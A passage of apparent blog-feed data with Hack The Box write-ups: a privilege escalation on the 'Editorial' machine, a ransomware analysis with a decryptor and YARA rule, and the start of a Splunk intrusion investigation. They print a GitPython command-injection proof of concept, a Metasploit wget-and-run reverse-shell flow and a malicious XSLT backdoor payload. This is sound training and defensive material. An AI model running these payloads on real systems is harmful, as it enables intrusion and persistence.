\u0026#39;api_route\u0026#39;: \u0026#39;/api/v1.1/metadata/\u0026#39; }}, { \u0026#39;1.2\u0026#39;: { \u0026#39;editorial\u0026#39;: api_editorial_name, \u0026#39;contact_email_1\u0026#39;: \u0026#39;soporte@tiempoarriba.oc\u0026#39;, \u0026#39;contact_email_2\u0026#39;: \u0026#39;info@tiempoarriba.oc\u0026#39;, \u0026#39;api_route\u0026#39;: f\u0026#39;/api/v1.2/metadata/\u0026#39; }}, { \u0026#39;2\u0026#39;: { \u0026#39;editorial\u0026#39;: api_editorial_name, \u0026#39;contact_email\u0026#39;: \u0026#39;info@tiempoarriba.moc.oc\u0026#39;, \u0026#39;api_route\u0026#39;: f\u0026#39;/api/v2/metadata/\u0026#39; }}, { \u0026#39;2.3\u0026#39;: { \u0026#39;editorial\u0026#39;: api_editorial_name, \u0026#39;contact_email\u0026#39;: api_editorial_email, \u0026#39;api_route\u0026#39;: f\u0026#39;{api_route}/\u0026#39; } }] } return jsonify(data_editorial) # -- : (development) mail message to new authors @app.route(api_route + \u0026#39;/authors/message\u0026#39;, methods=[\u0026#39;get\u0026#39;]) def api_mail_new_authors(): return jsonify({ \u0026#39;template_mail_message\u0026#39;: \u0026#34;welcome to the team! we are thrilled to have you on board and can\u0026#39;t wait to see the incredible content you\u0026#39;ll bring to the table.\\n\\nyour login credentials for our internal forum and authors site are:\\nusername: prod\\npassword: 080217_producti0n_2023!@\\nplease be sure to change your password as soon as possible for security purposes.\\n\\ndon\u0026#39;t hesitate to reach out if you have any questions or ideas - we\u0026#39;re always here to support you.\\n\\nbest regards, \u0026#34; + api_editorial_name + \u0026#34; team.\u0026#34; }) # todo: replace dev credentials when checks pass # ------------------------------- # start program # ------------------------------- if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;127.0.0.1\u0026#39;, port=5001, debug=true) looks like the we credentials for prod user. let\u0026rsquo;s try to ssh into the box as prod with the following credential.\nprod:080217_producti0n_2023!@ successfully logged in as prod. the user prod can run only the following script as sudo.\nprod@editorial:~$ sudo -l [sudo] password for prod: matching defaults entries for prod on editorial: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty user prod may run the following commands on editorial: (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py * let\u0026rsquo;s see what the script looks like.\nprod@editorial:~$ cat /opt/internal_apps/clone_changes/clone_prod_change.py #!/usr/bin/python3 import os import sys from git import repo os.chdir(\u0026#39;/opt/internal_apps/clone_changes\u0026#39;) url_to_clone = sys.argv[1] r = repo.init(\u0026#39;\u0026#39;, bare=true) r.clone_from(url_to_clone, \u0026#39;new_changes\u0026#39;, multi_options=[\u0026#34;-c protocol.ext.allow=always\u0026#34;]) the script is cloning a repository from a remote url. and it\u0026rsquo;s using a git library. let\u0026rsquo;s see which python package is that.\nprod@editorial:~$ pip3 list | grep -i git gitdb 4.0.10 gitpython 3.1.29 cve-2022-24439 according to snyk: affected versions( \u0026lt; 3.1.30) of gitpython package are vulnerable to remote code execution (rce) due to improper user input validation, which makes it possible to inject a maliciously crafted remote url into the clone command. exploiting this vulnerability is possible because the library makes external calls to git without sufficient sanitization of input arguments. this is only relevant when enabling the ext transport protocol.\npoc:\nfrom git import repo r = repo.init(\u0026#39;\u0026#39;, bare=true) r.clone_from(\u0026#39;ext::sh -c touch% /tmp/pwned\u0026#39;, \u0026#39;tmp\u0026#39;, multi_options=[\u0026#34;-c protocol.ext.allow=always\u0026#34;]) we found our pe vector. to exploit it i used the msfconsole\u0026rsquo;s web delivery module and set payload to linux/x64/shell/reverse_tcp. and i uploaded the payload to the prod user\u0026rsquo;s home directory.\nmetasploit\nmsf6 exploit(multi/script/web_delivery) \u0026gt; [*] started reverse tcp handler on 10.10.14.50:4444 [*] using url: http://10.10.14.50:8080/dhmvwiq [*] server started. [*] run the following command on the target machine: wget -qo kkqgpczc --no-check-certificate http://10.10.14.50:8080/dhmvwiq; chmod +x kkqgpczc; ./kkqgpczc\u0026amp; disown executing the payload using the exploit:\nprod@editorial:~$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py \u0026#39;ext::sh -c /home/prod/kkqgpczc\u0026#39; metasploit:\n[*] run the following command on the target machine: wget -qo kkqgpczc --no-check-certificate http://10.10.14.50:8080/dhmvwiq; chmod +x kkqgpczc; ./kkqgpczc\u0026amp; disown [*] 10.129.76.145 web_delivery - delivering payload (250 bytes) [*] 10.129.76.146 web_delivery - delivering payload (250 bytes) [*] sending stage (38 bytes) to 10.129.76.146 [*] command shell session 3 opened (10.10.14.50:4444 -\u0026gt; 10.129.76.146:34428) at 2024-06-18 18:33:50 +0200 msf6 exploit(multi/script/web_delivery) \u0026gt; sessions active sessions =============== id name type information connection -- ---- ---- ----------- ---------- 3 shell x64/linux 10.10.14.50:4444 -\u0026gt; 10.129.76.146:34428 ( 10.129.76.146) msf6 exploit(multi/script/web_delivery) \u0026gt; sessions -i 3 [*] starting interaction with 3... id uid=0(root) gid=0(root) groups=0(root) we successfully rooted the box.\n","title":"HTB Machine Editorial"},{"date":"2024-06-15","image":"","imageAlt":"","link":"https://hshakilst.github.io/posts/htb-sherlocks/lockpick1/","summary":"Lockpick 1 - Malware Analysis Scenario Forela needs your help! A whole portion of our UNIX servers have been hit with what we think is ransomware. We are refusing to pay the attackers and need you to find a way to recover the files provided.","tags":["cryptography","file-recovery","floss","ghidra","htb","jq","malware","ransomware","reverse-engineering","sherlock","static-analysis","virustotal"],"text":"lockpick 1 - malware analysis scenario forela needs your help! a whole portion of our unix servers have been hit with what we think is ransomware. we are refusing to pay the attackers and need you to find a way to recover the files provided. warning this is a warning that this sherlock includes software that is going to interact with your computer and files. this software has been intentionally included for educational purposes and is not intended to be executed or used otherwise. always handle such files in isolated, controlled, and secure environments. once the sherlock zip has been unzipped, you will find a danger.txt file. please read this to proceed.\nartifacts artifact md5 hash password lockpick1.zip e14430ea647d948e3084931652f5e534 hacktheblue bescrypt.zip ab7388c8a51ea6c8b53cbc11bfd463f2 e@iwyzxk7hk\u0026amp; tools flare-floss: for static malware analysis. jq: for querying json files. ghidra sre: for reverse engineering the malware and static analysis. sublime text editor xxd hex editor visual studio code tasks please confirm the encryption key string utilised for the encryption of the files provided? we have recently received an email from wbevansn1@cocolog-nifty.com demanding to know the first and last name we have him registered as. they believe they made a mistake in the application process. please confirm the first and last name of this applicant. what is the mac address and serial number of the laptop assigned to hart manifould? what is the email address of the attacker? city of london police have suspiciouns of some insider trading taking part within our trading organisation. please confirm the email address of the person with the highest profit percentage in a single trade alongside the profit percentage. our e-discovery team would like to confirm the ip address detailed in the sales forecast log for a user who is suspected of sharing their account with a colleague. please confirm the ip address for karylin o\u0026rsquo;hederscoll. which of the following file extensions is not targeted by the malware? .txt, .sql, .ppt, .pdf, .docx, .xlsx, .csv, .json, .xml we need to confirm the integrity of the files once decrypted. please confirm the md5 hash of the applicants db. we need to confirm the integrity of the files once decrypted. please confirm the md5 hash of the trading backup. we need to confirm the integrity of the files once decrypted. please confirm the md5 hash of the complaints file. malware analysis we have been given a directory forela-criticaldata that contains encrypted internal files by a ransomware. the sample of the ransomware is also given in a separate zip file bescrypt.zip. our objective is to recover the encrypted files by analyzing the malware.\nstatic analysis first, let\u0026rsquo;s see what kind of binary we are dealing with.\n$ file bescrypt3.2 bescrypt3.2: elf 64-bit lsb pie executable, x86-64, version 1 (sysv), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, buildid[sha1]=2b6eafade391d7be39a8aff0d2e3a60aa8b6a4c2, for gnu/linux 3.2.0, not stripped it\u0026rsquo;s an elf 64-bit binary. you can read more about elf binary in the medium article mentioned in the reference section.\nbinary headers\n$ readelf -h bescrypt3.2 elf header: magic: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 class: elf64 data: 2\u0026#39;s complement, little endian version: 1 (current) os/abi: unix - system v abi version: 0 type: dyn (position-independent executable file) machine: advanced micro devices x86-64 version: 0x1 entry point address: 0x1160 start of program headers: 64 (bytes into file) start of section headers: 14904 (bytes into file) flags: 0x0 size of this header: 64 (bytes) size of program headers: 56 (bytes) number of program headers: 13 size of section headers: 64 (bytes) number of section headers: 31 section header string table index: 30 let\u0026rsquo;s use floss and try to dump the strings of the binary.\n$ floss bescrypt3.2 --format sc64 info: floss: extracting static strings finding decoding function features: 100%|âââââ| 1/1 [00:00\u0026lt;00:00, 498.08 functions/s, skipped 0 library functions] info: floss.stackstrings: extracting stackstrings from 1 functions extracting stackstrings: 100%|âââââââââââââââââââââââââââââââââââââââââââââ| 1/1 [00:00\u0026lt;00:00, 151.76 functions/s] info: floss.tightstrings: extracting tightstrings from 0 functions... extracting tightstrings: 0 functions [00:00, ? functions/s] info: floss.string_decoder: decoding strings decoding strings: 100%|ââââââââââââââââââââââââââââââââââââââââââââââââââââ| 1/1 [00:00\u0026lt;00:00, 289.22 functions/s] info: floss: finished execution after 3.23 seconds info: floss: rendering results flare floss results (version 3.1.0) +------------------------+------------------------------------------------------------------------------------+ | file path | bescrypt3.2 | | identified language | unknown | | extracted strings | | | static strings | 127 (1700 characters) | | language strings | 0 ( 0 characters) | | stack strings | 0 | | tight strings | 0 | | decoded strings | 0 | +------------------------+------------------------------------------------------------------------------------+ ââââââââââââââââââââââââââââ floss static strings (127) ââââââââââââââââââââââââââââ +-----------------------------------+ | floss static strings: ascii (127) | +-----------------------------------+ /lib64/ld-linux-x86-64.so.2 rewind snprintf free fread closedir fopen strlen strstr malloc __libc_start_main remove __cxa_finalize ftell readdir fclose opendir fwrite strcmp fseek libc.so.6 glibc_2.34 glibc_2.2.5 _itm_deregistertmclonetable __gmon_start__ _itm_registertmclonetable pte1 u+uh atsh [a\\] error opening file: %s %s.24bes %s_note.txt this file has been encrypted by bes24 group, please contact us at bes24@protonmail.com to discuss payment for us providing you the decryption software.. error creating note file: %s error deleting original file: %s error opening directory: %s %s/%s .txt .sql .pdf .docx .xlsx .csv .json .xml encrypting: %s bhulishutrea98liop /forela-criticaldata/ ;*3$\u0026#34; gcc: (debian 12.2.0-13) 12.2.0 scrt1.o __abi_tag crtstuff.c deregister_tm_clones __do_global_dtors_aux completed.0 __do_global_dtors_aux_fini_array_entry frame_dummy __frame_dummy_init_array_entry bescrypt2.c __frame_end__ _dynamic __gnu_eh_frame_hdr _global_offset_table_ free@glibc_2.2.5 __libc_start_main@glibc_2.34 remove@glibc_2.2.5 _itm_deregistertmclonetable fread@glibc_2.2.5 _edata fclose@glibc_2.2.5 opendir@glibc_2.2.5 _fini strlen@glibc_2.2.5 rewind@glibc_2.2.5 snprintf@glibc_2.2.5 closedir@glibc_2.2.5 __data_start strcmp@glibc_2.2.5 ftell@glibc_2.2.5 __gmon_start__ __dso_handle _io_stdin_used readdir@glibc_2.2.5 malloc@glibc_2.2.5 _end fseek@glibc_2.2.5 __bss_start main encrypt_file process_directory fopen@glibc_2.2.5 fwrite@glibc_2.2.5 __tmc_end__ _itm_registertmclonetable __cxa_finalize@glibc_2.2.5 _init strstr@glibc_2.2.5 .symtab .strtab .shstrtab .interp .note.gnu.property .note.gnu.build-id .note.abi-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt .init .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame .init_array .fini_array .dynamic .got.plt .data .bss .comment +------------------------------------+ | floss static strings: utf-16le (0) | +------------------------------------+ âââââââââââââââââââââââââ floss stack strings (0) âââââââââââââââââââââââââ âââââââââââââââââââââââââ floss tight strings (0) âââââââââââââââââââââââââ âââââââââââââââââââââââââââ floss decoded strings (0) âââââââââââââââââââââââââââ we can see the structure of the elf binary, the function names it has, and some hard coded strings. most interesting ones are listed below:\nhard coded strings:\nerror opening file: %s %s.24bes %s_note.txt this file has been encrypted by bes24 group, please contact us at bes24@protonmail.com to discuss payment for us providing you the decryption software.. error creating note file: %s error deleting original file: %s error opening directory: %s %s/%s .txt .sql .pdf .docx .xlsx .csv .json .xml encrypting: %s bhulishutrea98liop /forela-criticaldata/ we found the encryption key which is bhulishutrea98liop. now, we need to figure out what kind of encryption we are dealing with.\nc header files and functions load order:\ngcc: (debian 12.2.0-13) 12.2.0 scrt1.o __abi_tag crtstuff.c deregister_tm_clones __do_global_dtors_aux completed.0 __do_global_dtors_aux_fini_array_entry frame_dummy __frame_dummy_init_array_entry bescrypt2.c __frame_end__ _dynamic __gnu_eh_frame_hdr _global_offset_table_ free@glibc_2.2.5 __libc_start_main@glibc_2.34 remove@glibc_2.2.5 _itm_deregistertmclonetable fread@glibc_2.2.5 _edata fclose@glibc_2.2.5 opendir@glibc_2.2.5 _fini strlen@glibc_2.2.5 rewind@glibc_2.2.5 snprintf@glibc_2.2.5 closedir@glibc_2.2.5 __data_start strcmp@glibc_2.2.5 ftell@glibc_2.2.5 __gmon_start__ __dso_handle _io_stdin_used readdir@glibc_2.2.5 malloc@glibc_2.2.5 _end fseek@glibc_2.2.5 __bss_start main encrypt_file process_directory fopen@glibc_2.2.5 fwrite@glibc_2.2.5 __tmc_end__ _itm_registertmclonetable __cxa_finalize@glibc_2.2.5 _init strstr@glibc_2.2.5 we discovered an interesting function named encrypt_file. let\u0026rsquo;s decompile the binary and look at the function\u0026rsquo;s source code using ghidra.\nencrypt_file\nvoid encrypt_file(char *param_1,char *param_2) { byte bvar1; ulong uvar2; int ivar3; size_t svar4; char local_848 [1024]; char local_448 [1032]; file *local_40; void *local_38; size_t local_30; file *local_28; ulong local_20; local_28 = fopen(param_1,\u0026#34;rb\u0026#34;); if (local_28 == (file *)0x0) { printf(\u0026#34;error opening file: %s\\n\u0026#34;,param_1); } else { fseek(local_28,0,2); local_30 = ftell(local_28); rewind(local_28); local_38 = malloc(local_30); fread(local_38,1,local_30,local_28); fclose(local_28); for (local_20 = 0; uvar2 = local_20, (long)local_20 \u0026lt; (long)local_30; local_20 = local_20 + 1) { bvar1 = *(byte *)((long)local_38 + local_20); svar4 = strlen(param_2); *(byte *)((long)local_38 + local_20) = bvar1 ^ param_2[uvar2 % svar4]; } snprintf(local_448,0x400,\u0026#34;%s.24bes\u0026#34;,param_1); local_28 = fopen(local_448,\u0026#34;wb\u0026#34;); fwrite(local_38,1,local_30,local_28); fclose(local_28); free(local_38); snprintf(local_848,0x400,\u0026#34;%s_note.txt\u0026#34;,local_448); local_40 = fopen(local_848,\u0026#34;w\u0026#34;); if (local_40 == (file *)0x0) { printf(\u0026#34;error creating note file: %s\\n\u0026#34;,local_848); } else { fwrite(\u0026#34;this file has been encrypted by bes24 group, please contact us at bes24@protonmail.com to discuss payment for us providing you the decryption software..\\n\u0026#34; ,1,0x99,local_40); fclose(local_40); } ivar3 = remove(param_1); if (ivar3 != 0) { printf(\u0026#34;error deleting original file: %s\\n\u0026#34;,param_1); } } return; } looks like xor encryption mechanism. i used chatgpt to describe the function\u0026rsquo;s source code. i got the following response. sure, letâs go through this c function encrypt_file step by step to understand how it works.\nfunction purpose the encrypt_file function reads a file, encrypts its content using a provided key, writes the encrypted content to a new file, and creates a note file indicating the file has been encrypted.\nfunction parameters char *param_1: the name (or path) of the file to be encrypted. char *param_2: the encryption key used to encrypt the file content. local variables byte bvar1: a byte variable used in the encryption process. ulong uvar2: a variable used in the encryption process for indexing. int ivar3: an integer to check the result of removing the original file. size_t svar4: size variable used to store the length of the encryption key. char local_848[1024]: a buffer to store the name of the note file. char local_448[1032]: a buffer to store the name of the encrypted file. file *local_40: file pointer for creating the note file. void *local_38: pointer to dynamically allocated memory for reading the file content. size_t local_30: variable to store the size of the file being read. file *local_28: file pointer for the file being read and the encrypted file being written. ulong local_20: loop counter used in the encryption process. step-by-step explanation open the original file:\nlocal_28 = fopen(param_1, \u0026#34;rb\u0026#34;); attempts to open the file specified by param_1 in binary read mode. if the file cannot be opened, it prints an error message. read the file content:\nfseek(local_28, 0, 2); local_30 = ftell(local_28); rewind(local_28); local_38 = malloc(local_30); fread(local_38, 1, local_30, local_28); fclose(local_28); seeks to the end of the file to determine its size (local_30). allocates memory to local_38 to hold the file content. reads the file content into local_38. closes the original file. encrypt the file content:\nfor (local_20 = 0; uvar2 = local_20, (long)local_20 \u0026lt; (long)local_30; local_20 = local_20 + 1) { bvar1 = *(byte *)((long)local_38 + local_20); svar4 = strlen(param_2); *(byte *)((long)local_38 + local_20) = bvar1 ^ param_2[uvar2 % svar4]; } iterates through each byte of the file content. encrypts each byte by xoring it with a byte from the encryption key param_2. the key is used in a cyclic manner. write the encrypted content to a new file:\nsnprintf(local_448, 0x400, \u0026#34;%s.24bes\u0026#34;, param_1); local_28 = fopen(local_448, \u0026#34;wb\u0026#34;); fwrite(local_38, 1, local_30, local_28); fclose(local_28); free(local_38); constructs the name for the encrypted file by appending \u0026ldquo;.24bes\u0026rdquo; to the original filename. opens the new file in binary write mode. writes the encrypted content to this new file. closes the new file and frees the allocated memory. create a note file:\nsnprintf(local_848, 0x400, \u0026#34;%s_note.txt\u0026#34;, local_448); local_40 = fopen(local_848, \u0026#34;w\u0026#34;); if (local_40 == (file *)0x0) { printf(\u0026#34;error creating note file: %s\\n\u0026#34;, local_848); } else { fwrite(\u0026#34;this file has been encrypted by bes24 group, please contact us at bes24@protonmail.com to discuss payment for us providing you the decryption software..\\n\u0026#34;, 1, 0x99, local_40); fclose(local_40); } constructs the name for the note file by appending \u0026ldquo;_note.txt\u0026rdquo; to the encrypted file name. opens the note file in write mode. writes a ransom note to the note file. closes the note file. delete the original file:\nivar3 = remove(param_1); if (ivar3 != 0) { printf(\u0026#34;error deleting original file: %s\\n\u0026#34;, param_1); } attempts to delete the original file. if deletion fails, it prints an error message. function\u0026rsquo;s purpose the encrypt_file function encrypts the content of a specified file using a provided key and saves the encrypted content to a new file with a \u0026ldquo;.24bes\u0026rdquo; extension. it also creates a note file containing a message from the \u0026ldquo;bes24 group,\u0026rdquo; and then attempts to delete the original file. this function mimics the behavior of ransomware.\nusing the help of chatgpt i created the following decryption tool in python. decryptor tool\nimport os import sys def decrypt_file(encrypted_file: str, decryption_key: str): try: # open the encrypted file for reading in binary mode with open(encrypted_file, \u0026#39;rb\u0026#39;) as ef: encrypted_data = ef.read() # prepare the decryption key key_length = len(decryption_key) # decrypt the data decrypted_data = bytearray() for i in range(len(encrypted_data)): decrypted_byte = encrypted_data[i] ^ ord(decryption_key[i % key_length]) decrypted_data.append(decrypted_byte) # prepare the output file name by removing the .24bes extension output_file = encrypted_file.replace(\u0026#39;.24bes\u0026#39;, \u0026#39;\u0026#39;) # write the decrypted data to the output file with open(output_file, \u0026#39;wb\u0026#39;) as df: df.write(decrypted_data) print(f\u0026#34;file decrypted successfully: {encrypted_file} -\u0026gt; {output_file}\u0026#34;) except filenotfounderror: print(f\u0026#34;error: the file {encrypted_file} does not exist.\u0026#34;) except exception as e: print(f\u0026#34;an error occurred: {e}\u0026#34;) def decrypt_directory(directory: str, decryption_key: str): # get all files in the directory with .24bes extension for filename in os.listdir(directory): if filename.endswith(\u0026#39;.24bes\u0026#39;): encrypted_file_path = os.path.join(directory, filename) decrypt_file(encrypted_file_path, decryption_key) # hardcoded decryption key decryption_key = \u0026#34;bhulishutrea98liop\u0026#34; if __name__ == \u0026#34;__main__\u0026#34;: if len(sys.argv) != 2: print(\u0026#34;usage: python decrypt_files.py \u0026lt;directory\u0026gt;\u0026#34;) sys.exit(1) directory = sys.argv[1] if not os.path.isdir(directory): print(f\u0026#34;error: {directory} is not a valid directory.\u0026#34;) sys.exit(1) decrypt_directory(directory, decryption_key) using this tool we were successful in decrypting the files of the forela-criticaldata directory.\nvirustotal virustotal - analysis\nyara rule this is my first yara rule. so, please forgive if it\u0026rsquo;s not good.\nrule bes24ransomware { meta: description = \u0026#34;detects bes24 ransomware\u0026#34; author = \u0026#34;shakil hossain\u0026#34; date = \u0026#34;2024-06-19\u0026#34; version = \u0026#34;1.0\u0026#34; hash = \u0026#34;19ad47d6e0a43e77e1d23534404bd7bb7f0742b961ef2b219160c9ef3945572d\u0026#34; score = 32 id = \u0026#34;fcaf0277-67bc-512a-97ff-4e8b30190eef\u0026#34; strings: $str1 = \u0026#34;this file has been encrypted by bes24 group, please contact us at bes24@protonmail.com to discuss payment for us providing you the decryption software..\u0026#34; $str2 = \u0026#34;.24bes\u0026#34; $str3 = \u0026#34;_note.txt\u0026#34; $str4 = \u0026#34;bes24@protonmail.com\u0026#34; condition: filesize \u0026lt; 20kb and any of ($str*) } after recovering the files we accomplished our objectives. now let\u0026rsquo;s answer the tasks.\ntask solution for task one we already have the encryption key listed above. we can find the answer in the forela_uk_applicants.sql file. we can find it in the it_assets.xml file. we can find it in any file with the .24bes_note.txt extension. to find this answer we can use jq with following query: jq 'to_entries | map(.value) | max_by(.profit_percentage) | {email, profit_percentage}' trading-firebase_bkup.json we can find this in the sales_forecast.xlsx file. also we can find this answer in the hard coded strings section. doing an md5sum on the file orela_uk_applicants.sql will get you the answer. doing an md5sum on the file trading-firebase_bkup.json will get you the answer. doing an md5sum on the file complaints.csv will get you the answer. please calculate the hashes for the file without modifying the file. you may feel tempting to format a file for better visibility. for forensic purpose make a copy of the original file then do operation on it. summary this was my first malware analysis sherlock, where i reversed a very simple ransomware. i did static analysis on the binary and found the encryption key and encryption algorithm which facilitate the creation of a decryption tool and recover the business critical files. i also created an yara rule to detect this malware. it was fun.\nreferences basics of elf (executable and linkable format) file by ajmewal - medium yara uuid generator using hash mastering yara rules: malware detection and analysis - veeam ","title":"HTB Sherlock Lockpick1"},{"date":"2024-06-15","image":"","imageAlt":"","link":"https://hshakilst.github.io/posts/htb-sherlocks/fragility/","summary":"Fragility (DFIR) Scenario In the monitoring team at our company, each member has access to Splunk web UI using an admin Splunk account. Among them, John has full control over the machine that hosts the entire Splunk system.","tags":["cryptography","cve-2023-46214","dfir","exploit","file-recovery","file-system","htb","linux","log","pcap","reverse-engineering","sherlock","splunk","wireshark"],"text":"fragility (dfir) scenario in the monitoring team at our company, each member has access to splunk web ui using an admin splunk account. among them, john has full control over the machine that hosts the entire splunk system. one day, he panicked and reported to us that an important file on his computer had disappeared. moreover, he also discovered a new account on the login screen. suspecting this to be the result of an attack, we proceeded to collect some evidence from his computer and also obtained network capture. can you help us investigate it?\nartifacts artifact md5 hash password fragility.zip e1d81df86e9201f99051c713620fb6c6 hacktheblue capture.pcapng 636aa4c094866c852fdebcb1c65d5944 n/a challenge.7z c1ebd1edb34e2953356b5200ecc673ac n/a tools wireshark - pcap analysis forensic analysis after acquiring the artifacts, i analyzed the pcap file using wireshark and exported the http objects. i found several suspicious requests two of them stands out the most.\nthe attacker uploaded a malicious xslt file to the splunk server.\nxslt (extensible stylesheet language transformations) is the recommended style sheet language for xml. xslt is far more sophisticated than css. with xslt you can add/remove elements and attributes to or from the output file. the file contained the following payload inside it.\nsearch.xsl\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;xsl:stylesheet version=\u0026#34;1.0\u0026#34; xmlns:xsl=\u0026#34;http://www.w3.org/1999/xsl/transform\u0026#34; xmlns:exsl=\u0026#34;http://exslt.org/common\u0026#34; extension-element-prefixes=\u0026#34;exsl\u0026#34;\u0026gt; \u0026lt;xsl:template match=\u0026#34;/\u0026#34;\u0026gt; \u0026lt;exsl:document href=\u0026#34;/opt/splunk/bin/scripts/search.sh\u0026#34; method=\u0026#34;text\u0026#34;\u0026gt; \u0026lt;xsl:text\u0026gt;#!/bin/bash\u0026amp;#10;adduser --shell /bin/bash --gecos nginx --quiet --disabled-password --home /var/www/ nginx\u0026amp;#10;access=$(echo mzlhnmjizty0ntyzlty3mdktotnhnc1howyzltjjztc4mjhm | base64 -d | rev)\u0026amp;#10;echo \u0026amp;quot;nginx:$access\u0026amp;quot; | chpasswd\u0026amp;#10;usermod -ag sudo nginx\u0026amp;#10;mkdir /var/www/.ssh\u0026amp;#10;echo \u0026amp;quot;ssh-rsa aaaab3nzac1yc2eaaaadaqabaaabgqdkoougbbg5oquaqww2jchy/zn49jmeeglqgvlimxv42sffxcurguoyostbb6hnhb5lkxjrbmg/183q1awn6hbmhpbzjzzqkwsfkgap34cop9b+e9oigsu12la1i7tpow1s6ae71d4ipj5pffxpubsg7zjaq2cah1qk/0rxiozybegydkvqc7ivd1tbvt0puoogwxllscutljxyqxg2ocda/8enlh+8ufkivzy4ylr4zny4dyhmwvdl06hcjtfcp4t/jwhf8sheld15gjuf1hzxouqy4qwit/oyrn789mq2ke+azp0weo/wtnhey9osqon04zgqh/blfnjjuq1kqyuuhrce1cxjut4cxazqhnnevwlgon5dklb/cwkicarx4cyqm36rqmustppvagmibcwixw9j3ax/qb2dr3df31znw4g5vhjyyrfekmczu1+dcux075njevjy+qdtmqvrxw9jev6oaphvlzc6lx8nnm8c6x6s4qbsu8ecllwyfwiwxqe= support@nginx.org\u0026amp;quot; \u0026amp;gt; /var/www/.ssh/authorized_keys\u0026amp;#10;chown -r nginx:nginx /var/www/\u0026amp;#10;cat /dev/null \u0026amp;gt; /root/.bash_history\u0026lt;/xsl:text\u0026gt; \u0026lt;/exsl:document\u0026gt; \u0026lt;/xsl:template\u0026gt; \u0026lt;/xsl:stylesheet\u0026gt; then the ta used splunks spl query language to execute the payload. apparently, the ta exploited cve-2023-46214 to compromise the splunk server. according to nist: in splunk enterprise versions below 9.0.7 and 9.1.2, splunk enterprise does not safely sanitize extensible stylesheet language transformations (xslt) that users supply. this means that an attacker can upload malicious xslt which can result in remote code execution on the splunk enterprise instance.\nthe splunk server version was 9.0.5. we can confirm this by the following data. it\u0026rsquo;s an authenticated remote code execution vulnerability, and the ta used the following credential to log into the splunk admin panel.\nusername=johnnyc password=h3re15j0hnny some how the credential was stolen by the ta.\nto search for the default time that was before and the default time that was set after, i took a look inside the /var/log directory. and i found two files that seemed archived log.\nvmware-network.log\n+ chmod 0600 /var/log/vmware-network.log + date + echo sun 14 apr 2024 09:57:59 pm +07 : executing \u0026#39;/etc/vmware-tools/scripts/vmware/network resume-vm\u0026#39; sun 14 apr 2024 09:57:59 pm +07 : executing \u0026#39;/etc/vmware-tools/scripts/vmware/network resume-vm\u0026#39; + echo + dirname /etc/vmware-tools/scripts/vmware/network + . /etc/vmware-tools/scripts/vmware/../../statechange.subr + main resume-vm + exitcode=0 + activelist=/var/run/vmware-active-nics + wakenetworkmanager + which dbus-send + dbussend=/usr/bin/dbus-send + rc=0 + [ 0 = 0 ] + /usr/bin/dbus-send --system --print-reply --dest=org.freedesktop.networkmanager /org/freedesktop/networkmanager org.freedesktop.networkmanager.enable boolean:true error org.freedesktop.networkmanager.alreadyenabledordisabled: already enabled + rc=1 + [ 1 = 0 ] + /usr/bin/dbus-send --system --print-reply --dest=org.freedesktop.networkmanager /org/freedesktop/networkmanager org.freedesktop.networkmanager.sleep boolean:false error org.freedesktop.networkmanager.alreadyasleeporawake: already awake + rc=1 + [ 1 = 0 ] + /usr/bin/dbus-send --system --print-reply --dest=org.freedesktop.networkmanager /org/freedesktop/networkmanager org.freedesktop.networkmanager.wake error org.freedesktop.dbus.error.unknownmethod: no such method âwakeâ + rc=1 + return 1 + exitcode=1 + [ 1 != 0 ] + sanity_check resume-vm + which ip + ip_cmd=/usr/sbin/ip + which ifconfig + ifconfig_cmd= + which ifup + ifup_cmd= + which ifdown + ifdown_cmd= + [ -z -a -z /usr/sbin/ip ] + [ ! -s /var/run/vmware-active-nics ] + save_active_nic_list + local intf_out + + [ -n /usr/sbin/ip ] + /usr/sbin/ip link show up + egrep \\bup\\b + awk -f: {print $2} + /usr/sbin/ip link show lo + grep -iq link/ether + grep -iq link/ether + /usr/sbin/ip link show ens33 + echo ens33 + run_network_script start + local action=start + local rc=0 + local script + true + exec_systemctl_service start + local rc=1 + local action=start + which systemctl + local ctlcmd=/usr/bin/systemctl + local service + [ -z /usr/bin/systemctl ] + /usr/bin/systemctl status systemd-networkd + grep -iq not-found + service=systemd-networkd + break + [ -z systemd-networkd ] + /usr/bin/systemctl start systemd-networkd + rc=0 + [ 0 = 0 -a systemd-networkd = systemd-networkd -a start = stop ] + return 0 + [ 0 != 0 ] + break + return 0 + rescue_nic + local rc=0 + local intf_out + [ -f /var/run/vmware-active-nics ] + read nic + [ -n /usr/sbin/ip ] + /usr/sbin/ip link show ens33 up + intf_out=2: ens33: \u0026lt;broadcast,multicast,up,lower_up\u0026gt; mtu 1500 qdisc fq_codel state up mode default group default qlen 1000 link/ether 00:0c:29:e1:89:42 brd ff:ff:ff:ff:ff:ff altname enp2s1 + grep -q up + echo 2: ens33: \u0026lt;broadcast,multicast,up,lower_up\u0026gt; mtu 1500 qdisc fq_codel state up mode default group default qlen 1000 link/ether 00:0c:29:e1:89:42 brd ff:ff:ff:ff:ff:ff altname enp2s1 + date + echo sun 14 apr 2024 09:57:58 pm +07 [rescue_nic] ens33 is already active. sun 14 apr 2024 09:57:58 pm +07 [rescue_nic] ens33 is already active. + read nic + rm -f /var/run/vmware-active-nics + return 0 + exitcode=0 + return 0 + date + echo sun 14 apr 2024 09:57:58 pm +07 : finished \u0026#39;/etc/vmware-tools/scripts/vmware/network resume-vm\u0026#39; sun 14 apr 2024 09:57:58 pm +07 : finished \u0026#39;/etc/vmware-tools/scripts/vmware/network resume-vm\u0026#39; found the current timezone offset which is +07.\nvmware-network.2.log\n+ chmod 0600 /var/log/vmware-network.log + date + echo sat 13 apr 2024 11:19:41 pm pdt : executing \u0026#39;/etc/vmware-tools/scripts/vmware/network poweron-vm\u0026#39; sat 13 apr 2024 11:19:41 pm pdt : executing \u0026#39;/etc/vmware-tools/scripts/vmware/network poweron-vm\u0026#39; + echo + dirname 